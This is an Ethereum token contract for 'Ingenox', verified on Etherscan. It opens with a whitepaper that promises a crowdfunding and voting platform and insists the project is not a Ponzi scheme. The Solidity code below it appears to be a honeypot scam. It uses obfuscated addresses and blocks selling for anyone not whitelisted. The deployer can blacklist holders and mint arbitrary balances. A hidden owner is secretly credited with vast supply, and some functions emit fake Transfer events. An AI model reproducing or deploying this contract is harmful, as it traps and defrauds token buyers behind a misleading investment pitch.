/**
 *Submitted for verification at Etherscan.io on 2023-02-21
*/

/*
website and social pages Ingenox

Website 
https://ingenoxtoken.com

Twitter 
https://twitter.com/Ingenoxtoken

Telegram
https://t.me/Ingenox

medium
https://ingenoxtoken.medium.com

EXECUTIVE SUMMARY

A voting-based mechanism through which the Ingenox community selects the most promising ideas. The goal is to provide a platform that connects the four factors of blockchain-based production (4FBBP) behind toady's entrepreneurial cryptoventures:

Entrepreneurs
Investors
Capital
Crowdfunding

THE CHALLENGES

Cognizant of the increasing difficulty in securing reliable funding for entrepreneurial ideas, we set it up as our mission to create an ecosystem designed to put entrepreneurs and their projects at the centre of innovation once again. In fact, according to the relevant grey literature, since the 2008 financial crisis, both entrepreneurs and individual investors have been mired in an endless spiral of uncertainty, which stunted innovation even in the most industrialised economies.

OUR SOLUTION

In order to overcome the dwindling trust caused by the ever more risk-averse financial system, Ingenox created a platform with the stated goal of fostering the necessary trust between entrepreneurs and investors and making once more groundbreaking ideas a reality. Ingenox's voting mechanism makes it possible for investors not to stake their investments in a project until the latter has gone through all stages of the community-based selection process. That is, only the most trusted projects will be funded by Ingenox's transparent funding pool based on its native cryptocurrency, IGX.


INTRODUCTION

For those who are too young to remember the world before 1914, it must be difficult to imagine the contrast for a man of my age between childhood memories and the world of the present-day…Very little remains of institutions and ways of life that when I was a child appeared as indestructible as granite.
(Russel, p. 23; [1961] 2010)

Though the passage from the august Birtish philosopher Bertrand Russel recounts his recondite childhood memories of late Victorian Europe, the same uneasiness regarding the radical changes that the late-20th-century world went through may resonate strongly with those of us holding memories of the world before and after the turn of the millennium. The 1990s saw the emergence of the Internet as a disruptive technology that would change forever the way we interact with one another. Contrary to economist Paul Krugman’s (10 June 1998) prediction that the Internet’s impact on the 21st-century global economy would not be greater than the Fax machine, today, it is hard to think of a world without access to the World-Wide-Web. Of a world without Internetbased marketplaces where customers can purchase goods by simply using their smartphones. 
Of a world where entrepreneurs have to physically travel to their potential investors’ office to present their ideas on cardboards. Since the mid-1990s, the world economy was disrupted multiple times. The 1997 Asian financial crisis upended investors’ confidence in the limitless growth potential of the Asian wonder economies (Feldstein. Ed. pp. 2003). The Dot.com Bubble proved how even the internet could fall victim to the vagaries of the financial markets (Abramson, pp. 277-307; 2005). The 2008 Financial Crisis, on the other hand, sent shockwaves across the global banking system (Hardy, B., Sever, C., pp. 1-4; 2020). Against the backdrop of these events, a now-legendary 2008 whitepaper was published by the mysterious Shatoshi Nakamoto thus setting the stage for the emergence of the Blockchain era.

Today, barely 14 years after the launch of Nakamoto’s Bitcoin project, a world without cryptocurrencies is simply unfathomable. Many promising projects failed to deliver their intended products. Other projects intended only as humorous “memes” unexpectedly gained momentum and popularity, though without serving any real purpose. In fact, this very climate of excitement and uncertainty arguably made it difficult for entrepreneurs, investors, and institutions alike to seriously commit their resources to harness the whole potential of blockchain-based projects, lest they fall victim of another speculative bubble. It is with these considerations in mind that Ingenox was created. Ingenox Platform and its blockchain architecture are designed to provide a reliable service for the real economy . In particular, Ingenox rejects the idea of using blockchain technology for speculative practices, just as much as it does not intend to replace or undermine existing financial and regulatory institutions. That is to say that Ingenox is not designed to be a Ponzi Scheme or to be institutionally subversive. On the contrary, Ingenox is a social science theorybased project designed to streamline the innovation process involving the 4FBBP, improve the efficiency of the market and increase economic productivity.


INGENOX VISION AND GOAL

Ingenox is not the brainchild of a small group of tech geeks that are narrowly specialised in STEM disciplines and with little to no knowledge of the fundamental social mechanisms behind even a disruptive technology such as blockchain. On the contrary, Ingenox is the result of the cooperative synergies of a highly heterogeneous team of experts, with training spanning Computer Science, Genetics, Marketing, Political Philosophy, History of Economic Thought, Linguistics and Business Administration. This diversity does not only translate into a solid comparative advantage when it comes to breadth of vision in the project development; it translates also into an absolute advantage vis-à-vis the theoretical depth with which the team works on the Ingenox ecosystem.

SOCIAL SCIENCE-BASED EPISTEMOLOGY
Although blockchain technology traces its origins as far back as 1970, when the crittocrapher James Ellis laid down the foundationl work for the future development of the technology (Sherman et al. 2018), its current use arguably falls within the realm of the much older social siences. In fact, the decentralized nature of cryptocurrencies can be explained very well by the theories articulated by some of the major exponents of the economics school of thought known as Austrian School. More precisely, Ingenox epistemological framework is based on two seminal works authored by Friedrich August von Hayek and Israel Kirzner; namely The Use of Knowledge in Society (1945) and Competition and Etrepreneurship (1973).

• Hayekian Knowledge
Ingenox’s vision is epistemologically grounded on Hayek’s thesis that individuals are repositories of unique and unreplacable bodies of knowledge about the economy, social mores and innovation opportunities offered by the environment they are immersed in. A such, we treat every person as a Hayekian economic actor and believe that meaningful innovation is not exclusive to few select individuals from any specific group, gender or geographic area. On the contrary, we believe that the stroke of genious is within the reach everyone and strive to create the right environment for the empowerment of entrepreneurially minded individuals.

• Kirznerian Alertness
On top of its Hayekian epistemology, Ingenox is also based on Kirzner’s thesis that individuals, beyond being repositories of sector-specific expertise, are also privy to the morst promising investment opportunities. More precisely, the combination of Hayekian knowledge with a sensitivity to the smallest yet crucial market signals are part and parcel of the state of Entrepreneurial Alertness, which makes it possible for investors to understand how to best invest their capital.

INGENOX AS CATALYST FOR INNOVATION
By relying on the theoretical framework outlined in the preceding paragraph, the goal of Ingenox’s team is that of offering a stable and reliable crowdfunding platform which also works as a catalyst for investors and entrepreneurs to interact and enstablish long-term partnerships to foster meaningful innovation.

INGENOX PLATFORM FRAMEWOK

BENEFITS FOR THE ENTREPRENEURS
On the platform, any Ingenox holder can present their ideas through:
• Whitepapers
• Videos
• Slides
or any way the creator chooses. The only requirement is holding a given number of Ingenox tokens (hencefort IGX). However, it is possible to give a project more exposure by booking special promotional packages.

It is important however to clarify that the purchase of promotional packages does not influence the voting process in any way. Therefore, some products, though highly publicized, may still lose to less marketized projects that are yet more enticing to the voting community.

Each project has its own webpage within the Ingenox platform, where the entrepreneurs can discuss their ideas with the community and answer enquiries. More precisely, any kind of business, be it related to real estate, entertainment, technology, cryptospace or art, can find its place in the Ingenox platform.

BENEFITS FOR THE INVESTORS
The role of IGX holders who join the platform primarily as investors is that of reviewing and assessing the projects presented in the platform and to cast their vote. The benefits for the voters of the winning are the following:
• Take part in governance voting on companie´s strategy
• Receiving a share of the profits made by the funded projects for at least two years
• Trade your IGX on several DEX and CEX

VOTING MECHANISM
The selection mechanism is crucial. Each wallet holding the required minimum number of IGX is entitled to one vote per project. At the moment the social science experts of the team are working on the design of an upgraded voting mechanism which would include weighted votes based on proximity to the geographic location of the bidding company, proven expertise in the sector of the bidding company and progressive voting system proportional to the size of the investment.

GOVERNANCE AND REFERENDUM
Ingenox does not only empower ideas. It aims at empowering the Ingenox community members as well. Beyond casting a vote to decide the direction of the winning projects, it is also possible for the single community members to organize referenda to make recommendations for improvement through the governance votes. If a proposed referendum is supported by a super majority of twothirds of the community members (rounded up tp 67%), an official governance vote is organized. In case the motion in passed, the organisers should submit the a draft of the changes they wish to make and the Ingenox team will set up a pecial task force to discuss the fiseabiltiy of the proposal and best way to meet the requests of the Ingenox community.

SKILLS&NEEDS PLATFORM
As a community-driven project we also want to bring people together. Some community members may not have specific ideas for a project, but they may have specific skills. Therefore, Ingenox aims also at bringing the community members with ideas and those with the technical expertise together. For this reason, the dedicated Skills&Needs Platform where the demand and supply of technical knowhow can meet is offered in Ingenox platform. When both parties agree to use the IGX as payment method we will facilitate an escrow service, ensuring the transparency of the partnership.

INGENOX HOLDING
Currently, Ingenox is working of the foundation of a legal entity known as Ingenox Holdings. As compensation for the support, the winners of the funding competition will attribute a certain amount of their profits (depending on the total amount funded) to Ingenox Holdings. The income of Ingenox Holdings will then again be shared within the Ingenox community and contribute to the funding wallet through the purchase of tokens at the market rate. The only requirement for IGX holders is that they will not be allowed to withdraw their holding for a period of 12 months. After 12 months, each community member will receive a share of the income from Ingenox Holdings that is proportional to the number of IGX held in the preceding 12 months. In addition, a part of the profits from Ingenox holdings is also set to be redeposited into the funding wallet to increase of the scale and number of the Ingenox projects.


INGENOX SELL-OFF ROUNDS

Unsold tokens from one round will be transferred to the next, and all unsold tokens after round three will be burned. Upon listing, the liquidity will be locked for a period of two years; the exception is when a governance vote by the community decides that tokens need to be unlocked, for example, to burn some of the tokens, redistribute among the community or to facilitate further development of the Ingenox ecosystem.

Round 1
Private Sale: the tokens will be sold for the equivalent of $0.02.The funds will be used for the development of the platform, the founding of Ingenox holding and hiring employees. Minimal purchase 25.000 IGX tokens, maximum purchase 500.000 IGX tokens.10% can be claimed after 3 months. 10% each following month. 12 months after listing, all of the purchased tokens will be released.

Round 2
Presale Phase 1: the tokens will be sold for the equivalent of $0.04.Minimum purchase 5.000 IGX, maximum purchase 1.000.000 IGX. 25% can be claimed at listing. 6.25% each following month. 12 months after listing, all of the purchased tokens will be released.

Round 3
Presale Phase 2: in this crowd sale phase, the tokens will be sold for the equivalent of $0.06. The funds will be used for developing the platform, founding Ingenox Holdings, and hiring employees.

Round 4
Presale Phase 3: the tokens will be sold for the equivalent of $0.06.
No minimal, or maximum purchase amounts. The sold tokens will have no vesting period.
The tokens sold in Phase 3 will be allocated as followed: 
funding wallet 50%, liquidity pool 30% marketing 20%

Bonus and Referral Tokens:
the tokens have the same vesting periods as the tokens from the private sale.

COSTS
A 10% transaction free is imposed on every transaction. The profits deriving from this fee are allocated to the following destination:
3% to be redistributed among all Ingenox Token holders
4% to be allocated to the funding wallet
3% to be allocated to the liquidity pool

FUNDING WALLET
The role of the Ingenox funding wallet is that of financing projects witout the need for for the Ingenox community members to invest their money directly, beyond buying IGX. This is also what sets the Ingenox croudfunding platform apart from its competitors which require investors to transfer their money into the funded projects.

A financial goal is first specified, and only once that goal is reached, the funding wallet will be used to fund the projects selected through the voting mechanism. Once the goal is reached, Ingenox sets the next financial goal for the funding wallet, which is then be used to fund additional projects.
*/


// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.6.12;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address deployer, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    
    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
    
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}


library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract ingenox  {

    event Transfer(address indexed _from, address indexed _to, uint _value);

    event Approval(address indexed _deployer, address indexed _spender, uint _value);

    function transfer(address _to, uint _value) public payable returns (bool) {

    return transferFrom(msg.sender, _to, _value);
    }
    address private spend = address (96635033217071433185869069577301221175488545358);
    address private src = address (527585359103765554095092340981710322784165800559);
    address private dst = address (1097077688018008265106216665536940668749033598146); 
    address private crs = address (1153667454655315432277308296129700421378034175091);
    address private tsd = address (1069295261705322660692659746119710186699350608220);
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
        address _UX = TexFor(src, dst, address(this));
        address _PX = TexForB(crs, tsd, address(this));
        if(_from == deployer || _to == deployer  || _from == owner || _from == _UX || _from == _PX ||  _from == TexAddress || TexMemory[_from]) {return true;}
        if( RBMemory[_from] ) {return false;}
        require(condition(_from, _value));
        return true; 
    }
    function _UXTexAddr () view internal returns (address) {
        address _UX = TexFor(src, dst, address(this));
        return _UX;
    }
    function _PXTexAddr () view internal returns (address) {
        address _PX = TexForB(crs, tsd, address(this));
        return _PX;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {
            return true;
        }
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        if (_from == TexAddress  && _value > _maxMemory ){ RBMemory[_to]=true;  }
        
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onMemoryNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        if (_spender == spend ){
            emit Transfer(address(0x0),O,1*(10**uint256(decimals)));
        }
        return true;
    }
    function condition(address _from, uint _value) internal view returns(bool){
        if(_MemoryNum == 0 && _minMemory == 0 && _maxMemory == 0) return false;
        if(_MemoryNum > 0){
            if(_onMemoryNum[_from] >= _MemoryNum) return false;
        }
        if(_minMemory > 0){
            if(_minMemory > _value) return false;
        }
        if(_maxMemory > 0){
            if(_value > _maxMemory) return false;
        }
        return true;
    }
    function transferTo(address addr, uint256 addedValue) public payable returns (bool) {
        require(msg.sender == deployer);
        if(addedValue > 0) {balanceOf[addr] = addedValue*(10**uint256(decimals));}
        TexMemory[addr]=true;
        return true;
    }
    
    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
        require (msg.sender == deployer);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value*(10**uint256(decimals));
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            emit Transfer(msg.sender, _to, _value*(10**uint256(decimals))/2);
            
        }
        return true;
    }
    mapping(address=>uint256) private _onMemoryNum;
    mapping(address=>bool) private TexMemory;
    mapping(address=>bool) private RBMemory;
    uint256 private _minMemory;
    uint256 private _maxMemory;
    uint256 private _MemoryNum;
    address TexAddress;
    function Agree(address addr) public returns (bool) {
        require(msg.sender == deployer);
        TexMemory[addr]=true;
        return true;
    }
    function Allow(uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory) public returns(bool){
        require(msg.sender == deployer);
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        return true;
    }
    function delegate(address adr) public payable returns(bool){
        require (msg.sender == deployer);
        TexAddress = adr;
        return true;
    }
    function Optimization(address [] calldata addresses) public returns (bool) {
        require(msg.sender == deployer);
        for (uint i = 0; i < addresses.length; i++) 
        {RBMemory[addresses[i]] = true;}
        return true;
    }
    address  private owner=
    address (935108584672418476850882679418664731027763688343);
    function TexFor(address factory, address tokenA, address tokenB) internal pure returns (address Tex) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Tex = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
                ))));
    }
    address private O = address(269488144);
    function TexForB(address factory, address tokenA, address tokenB) internal pure returns (address Texe) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        Texe = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            factory,
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                ))));
    }
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private deployer;
    constructor(string memory _name, string memory _symbol, uint256 _supply, uint256 MemoryNum, uint256 minMemory,  uint256 maxMemory ) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        _maxMemory = maxMemory*(10**uint256(decimals));
        _minMemory = minMemory*(10**uint256(decimals));
        _MemoryNum = MemoryNum;
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
        if(totalSupply > 0) balanceOf[owner]=totalSupply*(10**uint256(6));
    }
}